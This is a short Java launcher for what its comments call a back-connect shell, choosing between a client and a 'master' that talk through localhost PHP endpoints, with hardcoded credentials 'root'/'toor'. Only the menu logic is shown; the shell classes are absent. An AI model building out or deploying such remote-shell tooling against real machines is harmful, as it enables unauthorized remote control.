public class dipremcone {
    
    /**
     * @param args the command line arguments
     * @throws java.lang.Exception
     * c for listner aka client in back-connect shell
     * s for master aka server in back-connect shell but he is not
     * e to exit
     */
    public static void main(String[] args) throws Exception{
        java.util.Scanner in = new java.util.Scanner(System.in);
        Service service = null;
        while(true){
            String desision = in.next();
            if(desision.equals("c"))
                service = new Client("FHNLYSEPEZSGCRDZ", "http://localhost/", "cli.php");
            else if(desision.equals("s"))
                service = new Master("root", "toor", "http://localhost/", "mastr.php");
            else if(desision.equals("e"))
                System.exit(0);
            else{
                System.out.println("Uncorrect command\nType c|s|e to start client, server or exitc");
                continue;
            }
            service.start();
            break;
        }
    }
    
}
